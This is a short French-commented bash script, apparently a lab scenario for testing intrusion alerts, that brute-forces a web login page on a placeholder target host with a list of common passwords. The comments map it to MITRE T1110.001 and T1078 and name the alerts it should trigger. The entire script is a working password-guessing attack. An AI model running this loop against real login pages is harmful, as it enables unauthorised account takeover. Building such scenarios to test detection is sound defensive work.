#!/bin/bash
# Scénario 2 — Force brute sur l'espace client (MITRE T1110.001 Password Guessing, puis T1078 Valid Accounts)
# Attendu : 100101 (échecs), 100102 (force brute), 100103 (succès après force brute) + réponse active
CIBLE=${CIBLE:-cible}
USER=${1:-amoukouama}
LISTE=(123456 password azerty congo2026 brazzaville motdepasse Brazza2025 admin123 qwerty soleil Brazza2026)
echo "[*] Force brute sur le compte $USER"
for p in "${LISTE[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -c /tmp/c.txt -d "login=$USER&password=$p" "http://$CIBLE/index.php")
  echo "  $p -> HTTP $code"
  [ "$code" = "302" ] && { echo "[!] Mot de passe trouvé : $p"; break; }
done
